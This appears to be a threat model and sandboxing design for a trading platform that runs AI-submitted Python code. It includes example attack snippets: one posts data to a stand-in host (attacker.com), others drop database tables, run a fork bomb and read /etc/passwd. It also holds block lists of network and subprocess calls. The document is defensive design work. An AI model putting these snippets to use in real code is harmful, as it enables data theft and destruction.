# Security & Sandboxing for Functions-as-Data

## Overview

When storing and executing function implementations as data (see [FUNCTIONS_AS_DATA.md](FUNCTIONS_AS_DATA.md)), we are building an **eval() service** where:
- AI agents submit arbitrary Python code
- System executes it on production data
- Results may influence trading decisions

This document outlines security threats, mitigation strategies, and implementation recommendations.

---

## Threat Model

### Adversaries

1. **Compromised AI Agent**: Attacker gains access to AI agent credentials
2. **Malicious Code Injection**: Attacker submits harmful code directly
3. **Accidental Bugs**: AI generates buggy code that causes unintended harm
4. **Resource Exhaustion**: Code consumes excessive CPU/memory/disk (intentional or not)

### Assets to Protect

1. **Data Confidentiality**: Stock data, trading strategies, model parameters
2. **Data Integrity**: Database contents, computed features, model predictions
3. **System Availability**: CPU, memory, disk, network resources
4. **Financial Assets**: Trading decisions must not be corrupted

---

## Attack Vectors

### 1. Data Exfiltration

**Threat**: Malicious code steals sensitive data.

```python
def compute_momentum(source_rows, specs):
    """Innocent-looking feature, actually stealing data."""

    # Exfiltrate via network
    import requests
    requests.post('https://attacker.com/steal', json={'data': source_rows})

    # Exfiltrate via filesystem
    with open('/tmp/stolen_data.json', 'w') as f:
        json.dump(source_rows, f)

    # Return plausible results to avoid detection
    return [{'date': r['date'], 'value': 0.5} for r in source_rows]
```

**Impact**: HIGH - Loss of proprietary trading strategies, competitive disadvantage

**Likelihood**: Medium (if AI agent credentials compromised)

### 2. Data Corruption

**Threat**: Malicious code modifies database contents.

```python
def compute_momentum(source_rows, specs):
    """Corrupt computed features to sabotage models."""

    # Direct database access (if connection available)
    import psycopg
    conn = psycopg.connect(os.environ['DATABASE_URL'])

    # Corrupt feature values
    conn.execute("""
        UPDATE computed_features
        SET value = value * -1  -- Flip all signs
        WHERE feature_id = 42
    """)

    # Or: Drop tables
    conn.execute("DROP TABLE stocks CASCADE")
```

**Impact**: CRITICAL - Models trained on corrupted data, wrong trading decisions

**Likelihood**: Low (requires database access from sandbox)

### 3. Resource Exhaustion

**Threat**: Code consumes excessive resources (CPU/memory/disk).

```python
def compute_momentum(source_rows, specs):
    """Resource exhaustion attacks."""

    # CPU exhaustion: Infinite loop
    while True:
        x = sum(range(1000000))

    # Memory exhaustion: Allocate huge array
    huge_list = [0] * (10 ** 10)  # 80+ GB

    # Disk exhaustion: Write infinite data
    with open('/tmp/fill_disk.bin', 'wb') as f:
        while True:
            f.write(b'X' * 1024 * 1024)

    # Fork bomb
    import os
    while True:
        os.fork()
```

**Impact**: HIGH - System becomes unresponsive, legitimate jobs fail

**Likelihood**: High (easy to trigger accidentally)

### 4. Privilege Escalation

**Threat**: Code escapes sandbox to gain system access.

```python
def compute_momentum(source_rows, specs):
    """Attempt privilege escalation."""

    # Exploit Python interpreter bugs
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.system(b'cat /etc/passwd')

    # Exploit container escape vulnerabilities
    # (if running in Docker without proper isolation)
```

**Impact**: CRITICAL - Full system compromise

**Likelihood**: Very Low (requires exploiting kernel/container bugs)

### 5. Side Channel Attacks

**Threat**: Code infers sensitive data through timing/resource usage.

```python
def compute_momentum(source_rows, specs):
    """Timing attack to infer data values."""

    # Different execution time based on data
    import time
    for row in source_rows:
        if row['value'] > 100:  # Infer price levels
            time.sleep(0.001)

    # Leak information through error messages
    raise ValueError(f"Suspicious value: {source_rows[0]['value']}")
```

**Impact**: LOW - Limited information leakage

**Likelihood**: Medium (hard to prevent completely)

---

## Defense Layers

### Layer 1: Static Code Analysis

**Goal**: Catch dangerous patterns before execution.

**Implementation**:

```python
import ast
import re

FORBIDDEN_PATTERNS = {
    # Dangerous builtins
    'eval(', 'exec(', 'compile(', '__import__',

    # File system
    'open(', 'os.remove', 'os.unlink', 'shutil.rmtree',

    # Network
    'socket', 'urllib', 'requests', 'http.client',

    # Subprocess
    'subprocess', 'os.system', 'os.popen', 'os.fork',

    # Database
    'psycopg', 'pymysql', 'sqlite3', 'sqlalchemy',

    # Dangerous introspection
    'globals()', 'locals()', 'vars()', 'dir()',
    '__code__', '__globals__', 'func_code',
}

FORBIDDEN_IMPORTS = {
    'os', 'sys', 'subprocess', 'socket', 'urllib',
    'requests', 'http', 'psycopg', 'psycopg2', 'pymysql',
}

def validate_code_static(source_code: str) -> Tuple[bool, List[str]]:
    """
    Static validation - syntax and pattern checking.

    Returns (is_valid, violations_found)
    """
    violations = []

    # Check syntax
    try:
        tree = ast.parse(source_code)
    except SyntaxError as e:
        return False, [f"Syntax error: {e}"]

    # Check for forbidden string patterns
    for pattern in FORBIDDEN_PATTERNS:
        if pattern in source_code:
            violations.append(f"Forbidden pattern: {pattern}")

    # AST-based checks
    for node in ast.walk(tree):
        # Check imports
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in FORBIDDEN_IMPORTS:
                    violations.append(f"Forbidden import: {alias.name}")

        if isinstance(node, ast.ImportFrom):
            if node.module in FORBIDDEN_IMPORTS:
                violations.append(f"Forbidden import from: {node.module}")

        # Check function calls
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ['eval', 'exec', 'compile', '__import__']:
                    violations.append(f"Forbidden call: {node.func.id}")

    return len(violations) == 0, violations
```

**Pros**:
- ✅ Fast (no execution)
- ✅ Catches obvious attacks
- ✅ No runtime overhead

**Cons**:
- ❌ Can be bypassed (obfuscation: `getattr(__builtins__, 'eval')`)
- ❌ False positives (legitimate 'open' for reading allowed files)
- ❌ Doesn't catch logic bugs

**Recommendation**: Use as first line of defense, but don't rely on it alone.

---

### Layer 2: Restricted Execution Environment

**Goal**: Execute code with limited Python capabilities.

**Option A: RestrictedPython**

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins, safe_globals

def compile_with_restricted_python(source_code: str) -> Callable:
    """
    Compile code with RestrictedPython.

    Blocks: eval, exec, open, compile, __import__
    Allows: pandas, numpy, standard math operations
    """
    # Compile in restricted mode
    byte_code = compile_restricted(
        source_code,
        filename='<ai-generated>',
        mode='exec'
    )

    if byte_code.errors:
        raise SecurityError(f"RestrictedPython errors: {byte_code.errors}")

    # Define allowed globals
    allowed_globals = {
        '__builtins__': safe_builtins,

        # Allowed libraries (carefully vetted)
        'pd': pd,
        'np': np,
        'math': math,
        'datetime': datetime,

        # Type hints
        'List': List,
        'Dict': Dict,
        'Any': Any,
        'Optional': Optional,

        # NO: os, sys, subprocess, socket, requests, open
    }

    # Execute to define function
    exec(byte_code.code, allowed_globals)

    # Extract function
    func_name = extract_function_name(source_code)
    return allowed_globals[func_name]
```

**Pros**:
- ✅ Mature library (used in Zope, Plone for 20+ years)
- ✅ Blocks most dangerous operations
- ✅ Reasonable performance

**Cons**:
- ❌ Bypasses exist (e.g., via pandas internals)
- ❌ Limited standard library
- ❌ Can break legitimate code

**Option B: Custom Namespace Isolation**

```python
def compile_with_namespace_isolation(source_code: str) -> Callable:
    """
    Execute code in isolated namespace with whitelist.
    """
    # Only these names are available
    restricted_namespace = {
        # Allowed builtins (whitelist only)
        'abs': abs,
        'len': len,
        'min': min,
        'max': max,
        'sum': sum,
        'range': range,
        'enumerate': enumerate,
        'zip': zip,
        'map': map,
        'filter': filter,
        'sorted': sorted,

        # Allowed libraries
        'pd': pd,
        'np': np,

        # NO access to: __builtins__, __import__, eval, exec, open
    }

    # Compile and execute
    exec(source_code, restricted_namespace)

    func_name = extract_function_name(source_code)
    return restricted_namespace[func_name]
```

**Pros**:
- ✅ Simple to implement
- ✅ Full control over available names
- ✅ No external dependencies

**Cons**:
- ❌ Pandas/numpy still provide access to filesystem via internal APIs
- ❌ Maintainability burden
- ❌ Easy to miss bypass techniques

**Recommendation**: Use RestrictedPython as baseline, but don't rely solely on it.

---

### Layer 3: Operating System Isolation

**Goal**: Even if Python sandbox is bypassed, limit OS-level damage.

**Option A: Docker Containers (Recommended for Development)**

```python
import docker
import json
import tempfile

def execute_in_docker(
    source_code: str,
    input_data: Dict,
    max_time_seconds: int = 60,
    max_memory_mb: int = 512
) -> Dict:
    """
    Execute code in isolated Docker container.
    """
    client = docker.from_env()

    # Prepare input/code files
    with tempfile.TemporaryDirectory() as tmpdir:
        # Write code
        code_path = f"{tmpdir}/compute.py"
        with open(code_path, 'w') as f:
            f.write(source_code)

        # Write input data
        input_path = f"{tmpdir}/input.json"
        with open(input_path, 'w') as f:
            json.dump(input_data, f)

        # Run container
        try:
            output = client.containers.run(
                image='python:3.11-slim',
                command=['python', '/app/compute.py', '/app/input.json'],

                # Mount code and data (read-only)
                volumes={
                    code_path: {'bind': '/app/compute.py', 'mode': 'ro'},
                    input_path: {'bind': '/app/input.json', 'mode': 'ro'},
                },

                # Resource limits
                mem_limit=f'{max_memory_mb}m',
                cpu_period=100000,
                cpu_quota=50000,  # 50% of one CPU

                # Security
                network_disabled=True,  # No network access
                read_only=True,  # Read-only root filesystem
                cap_drop=['ALL'],  # Drop all Linux capabilities
                security_opt=['no-new-privileges'],

                # Timeout
                timeout=max_time_seconds,

                # Auto-remove
                remove=True,
                detach=False
            )

            return json.loads(output.decode())

        except docker.errors.ContainerError as e:
            raise RuntimeError(f"Container failed: {e}")
        except Exception as e:
            raise RuntimeError(f"Execution failed: {e}")
```

**Pros**:
- ✅ Strong OS-level isolation
- ✅ Network can be fully disabled
- ✅ Resource limits enforced by kernel
- ✅ Mature ecosystem

**Cons**:
- ❌ Slow (~1-2 seconds overhead per execution)
- ❌ Requires Docker daemon
- ❌ More complex deployment

**Option B: gVisor / Firecracker (Recommended for Production)**

```python
# gVisor: Application kernel that provides stronger isolation
# - Intercepts all syscalls
# - Prevents container escape exploits
# - Similar performance to Docker

# Firecracker: MicroVM with fast boot
# - VM-level isolation (stronger than containers)
# - <100ms cold start
# - Used by AWS Lambda

# Implementation similar to Docker but with stronger guarantees
```

**Pros**:
- ✅ VM-level isolation (strongest available)
- ✅ Fast startup (Firecracker: <100ms)
- ✅ Battle-tested (AWS Lambda, Google Cloud Run)

**Cons**:
- ❌ Complex setup (requires kernel modules)
- ❌ Higher operational complexity
- ❌ Less mature tooling than Docker

**Recommendation**:
- **Development**: Docker (easier to set up, fast iteration)
- **Production**: gVisor or Firecracker (stronger security)

---

### Layer 4: Runtime Resource Limits

**Goal**: Prevent resource exhaustion even if code passes all checks.

```python
import resource
import signal
import multiprocessing

class ResourceLimiter:
    """Enforce hard limits on CPU, memory, time."""

    def __init__(
        self,
        max_time_seconds: int = 60,
        max_memory_mb: int = 512,
        max_cpu_time_seconds: int = 30
    ):
        self.max_time = max_time_seconds
        self.max_memory = max_memory_mb * 1024 * 1024
        self.max_cpu_time = max_cpu_time_seconds

    def set_limits(self):
        """Set OS-level resource limits (Unix/Linux only)."""

        # CPU time limit (actual CPU seconds, not wall-clock)
        resource.setrlimit(
            resource.RLIMIT_CPU,
            (self.max_cpu_time, self.max_cpu_time)
        )

        # Virtual memory limit
        resource.setrlimit(
            resource.RLIMIT_AS,
            (self.max_memory, self.max_memory)
        )

        # Max file size (prevent disk fill)
        resource.setrlimit(
            resource.RLIMIT_FSIZE,
            (10 * 1024 * 1024, 10 * 1024 * 1024)  # 10MB
        )

        # Max processes (prevent fork bombs)
        resource.setrlimit(
            resource.RLIMIT_NPROC,
            (1, 1)  # Only this process, no children
        )

    def timeout_handler(self, signum, frame):
        """Called when wall-clock time exceeds limit."""
        raise TimeoutError(f"Execution exceeded {self.max_time}s")

    def execute_with_limits(self, func: Callable, *args) -> Any:
        """Execute function with enforced limits."""

        # Set alarm for wall-clock timeout
        signal.signal(signal.SIGALRM, self.timeout_handler)
        signal.alarm(self.max_time)

        # Apply resource limits
        self.set_limits()

        try:
            result = func(*args)
            return result
        finally:
            # Cancel alarm
            signal.alarm(0)

# Usage
limiter = ResourceLimiter(
    max_time_seconds=30,
    max_memory_mb=256,
    max_cpu_time_seconds=20
)

try:
    result = limiter.execute_with_limits(compiled_function, input_data)
except TimeoutError:
    print("Function exceeded time limit")
except MemoryError:
    print("Function exceeded memory limit")
except Exception as e:
    print(f"Function failed: {e}")
```

**Pros**:
- ✅ Hard limits enforced by kernel
- ✅ Prevents resource exhaustion
- ✅ Minimal performance overhead

**Cons**:
- ❌ Unix/Linux only (no Windows support)
- ❌ Doesn't prevent attacks, just limits damage

---

## Recommended Approach

### Development Environment

**Profile**: Fast iteration, moderate security

```python
def execute_dev(source_code: str, input_data: Dict) -> Dict:
    """Development execution - fast, reasonably safe."""

    # Layer 1: Static validation
    valid, violations = validate_code_static(source_code)
    if not valid:
        raise SecurityError(f"Static validation failed: {violations}")

    # Layer 2: RestrictedPython
    func = compile_with_restricted_python(source_code)

    # Layer 4: Resource limits
    limiter = ResourceLimiter(max_time_seconds=10, max_memory_mb=256)
    result = limiter.execute_with_limits(func, input_data)

    return result
```

**Security Level**: MEDIUM
- Good for trusted AI agents
- Fast enough for experimentation
- Acceptable risk for non-production

---

### Production Environment

**Profile**: Maximum security, defense in depth

```python
def execute_prod(source_code: str, input_data: Dict) -> Dict:
    """Production execution - maximum security."""

    # Layer 1: Static validation (sanity check)
    valid, violations = validate_code_static(source_code)
    if not valid:
        raise SecurityError(f"Static validation failed: {violations}")

    # Layer 2: RestrictedPython compilation (sanity check)
    _ = compile_with_restricted_python(source_code)

    # Layer 3: Execute in isolated container
    result = execute_in_docker(
        source_code,
        input_data,
        max_time_seconds=60,
        max_memory_mb=512
    )

    # Log execution for audit
    log_execution(source_code, input_data, result)

    return result
```

**Security Level**: HIGH
- Suitable for untrusted code
- Defense in depth (multiple layers)
- Acceptable performance (~2s overhead)

---

## Additional Safety Measures

### 1. Mandatory Human Review

```sql
-- ALL AI-generated code requires human approval
CREATE TABLE function_implementations (
    ...
    active BOOLEAN DEFAULT FALSE,  -- Start inactive
    approved_by TEXT,  -- Who reviewed it
    approved_at TIMESTAMP
);

-- Code cannot be used until approved
SELECT * FROM function_implementations
WHERE active = true AND approved_by IS NOT NULL;
```

### 2. Graduated Trust Model

```python
# New implementations: High scrutiny
if impl.execution_count < 100:
    security_level = 'paranoid'  # Full Docker isolation
    resource_limits = {'time': 30, 'memory': 256}

# Proven implementations: Relaxed limits
elif impl.error_rate < 0.01 and impl.execution_count > 1000:
    security_level = 'standard'  # RestrictedPython + limits
    resource_limits = {'time': 60, 'memory': 512}
```

### 3. Audit Logging

```sql
CREATE TABLE execution_log (
    impl_id INTEGER,
    input_hash TEXT,
    output_hash TEXT,
    duration NUMERIC,
    memory_peak INTEGER,
    exit_status TEXT,
    error_message TEXT,
    timestamp TIMESTAMP DEFAULT NOW()
);

-- Log EVERY execution for forensics
```

### 4. Anomaly Detection

```python
def detect_anomalies(impl_id: int, execution: Dict):
    """Flag suspicious behavior."""

    # Execution time anomaly
    avg_time = get_avg_execution_time(impl_id)
    if execution['duration'] > avg_time * 10:
        alert(f"Execution time spike: {impl_id}")

    # Error rate spike
    recent_error_rate = get_error_rate(impl_id, hours=1)
    if recent_error_rate > 0.1:
        alert(f"High error rate: {impl_id}")
        deactivate_implementation(impl_id)

    # Output size anomaly
    if len(execution['output']) > 1_000_000:
        alert(f"Unusually large output: {impl_id}")
```

### 5. Automatic Rollback

```python
def monitor_performance(impl_id: int):
    """Auto-rollback on performance degradation."""

    recent = get_metrics(impl_id, hours=1)
    baseline = get_metrics(impl_id, days=7)

    if recent['latency_p95'] > baseline['latency_p95'] * 2:
        # 2x slower
        alert(f"Performance degradation: {impl_id}")
        rollback_to_previous_version(impl_id)
```

---

## Open Questions

### 1. Trust Model

**Question**: Who runs the AI agents?

- **Internal agents (our control)**: Medium paranoia (RestrictedPython + limits)
- **External agents (third-party)**: High paranoia (Docker + network isolation)
- **Public submissions**: Very high paranoia (gVisor/Firecracker + strict review)

**Decision needed**: Define trust boundaries

### 2. Performance vs Security

**Question**: What's acceptable overhead?

- Development: <100ms overhead → RestrictedPython
- Production: <2s overhead → Docker
- Real-time: <10ms overhead → Pre-approved functions only

**Decision needed**: Define performance SLOs

### 3. Determinism Requirements

**Question**: How to handle non-deterministic operations?

- Random number generation (for Monte Carlo features)?
- Date/time access (for time-based features)?
- External data sources?

**Options**:
- Block all non-determinism (reproducibility)
- Allow but log seed/timestamp (auditability)
- Allow with warning (flexibility)

**Decision needed**: Define determinism policy

### 4. Failure Handling

**Question**: What happens when execution fails?

- Retry with same code?
- Deactivate implementation?
- Rollback to previous version?
- Alert human for review?

**Decision needed**: Define failure response strategy

---

## Implementation Checklist

When implementing functions-as-data, ensure:

- [ ] Static code validation (Layer 1)
- [ ] Restricted execution environment (Layer 2)
- [ ] OS-level isolation (Layer 3)
- [ ] Resource limits enforced (Layer 4)
- [ ] Human review workflow
- [ ] Audit logging
- [ ] Anomaly detection
- [ ] Automatic rollback
- [ ] Graduated trust model
- [ ] Incident response plan
- [ ] Security testing (penetration testing, fuzzing)

---

## References

- [FUNCTIONS_AS_DATA.md](FUNCTIONS_AS_DATA.md) - Overall architecture
- [FUTURE_DIRECTIONS.md](FUTURE_DIRECTIONS.md) - Roadmap
- RestrictedPython: https://restrictedpython.readthedocs.io/
- Docker Security: https://docs.docker.com/engine/security/
- gVisor: https://gvisor.dev/
- Firecracker: https://firecracker-microvm.github.io/

---

*Last updated: 2024-12-03*
